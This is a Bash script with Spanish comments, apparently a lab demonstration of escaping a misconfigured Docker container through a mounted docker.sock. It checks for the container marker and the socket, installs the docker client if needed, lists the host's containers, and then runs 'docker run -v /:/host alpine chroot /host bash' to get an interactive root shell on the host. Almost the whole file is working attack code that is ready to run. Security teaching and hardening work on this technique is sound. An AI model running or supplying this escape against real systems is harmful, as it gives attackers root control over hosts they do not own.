#!/bin/bash

# ================================================
# escape.sh - Demostracion del container escape
# Autor: adriapuga
# Descripcion: Demuestra el escape de un contenedor
#              mal configurado al host via docker.sock
# Uso: ./escape.sh
# Requisito: ejecutar desde dentro del vuln-container
# ================================================

echo "========================================"
echo "  CONTAINER ESCAPE - DEMOSTRACION"
echo "  Fecha: $(date)"
echo "========================================"

# ----------------------------------------
# FASE 1: Reconocimiento dentro del contenedor
# ----------------------------------------
echo ""
echo "[*] Fase 1: Reconocimiento del entorno..."
echo ""

echo "[*] Verificando que estamos en un contenedor..."
if [ -f /.dockerenv ]; then
    echo "[+] /.dockerenv encontrado -> estamos en un contenedor Docker"
else
    echo "[-] No parece un contenedor Docker"
    exit 1
fi

echo ""
echo "[*] Sistema operativo del contenedor:"
cat /etc/os-release | grep PRETTY_NAME

echo ""
echo "[*] IP interna del contenedor:"
hostname -I

echo ""
echo "[*] Verificando docker.sock..."
if [ -S /var/run/docker.sock ]; then
    echo "[+] docker.sock encontrado: $(ls -la /var/run/docker.sock)"
    echo "[+] VECTOR DE ESCAPE DISPONIBLE"
else
    echo "[-] docker.sock no encontrado. Este contenedor no es vulnerable a este ataque."
    exit 1
fi

# ----------------------------------------
# FASE 2: Verificar acceso al daemon Docker
# ----------------------------------------
echo ""
echo "[*] Fase 2: Verificando acceso al daemon Docker del host..."
echo ""

if ! command -v docker &> /dev/null; then
    echo "[*] Cliente docker no instalado. Instalando..."
    apt update -qq && apt install -y docker.io -qq
fi

echo "[*] Contenedores visibles desde el host (via docker.sock):"
docker ps

echo ""
echo "[+] Podemos ver y controlar los contenedores del HOST desde dentro del contenedor"

# ----------------------------------------
# FASE 3: Container escape via docker.sock
# ----------------------------------------
echo ""
echo "[*] Fase 3: Ejecutando container escape..."
echo ""
echo "[*] Lanzando contenedor con filesystem del host montado..."
echo "[*] Comando: docker run -it --rm -v /:/host alpine chroot /host bash"
echo ""
echo "[!] A partir de aqui tendras una shell en el HOST REAL como root"
echo "[!] Ejecuta 'id' y 'cat /etc/os-release' para verificar"
echo "[!] Escribe 'exit' para volver al contenedor"
echo ""

docker run -it --rm -v /:/host alpine chroot /host bash

echo ""
echo "========================================"
echo "  ESCAPE COMPLETADO"
echo "  Has vuelto al contenedor"
echo "========================================"
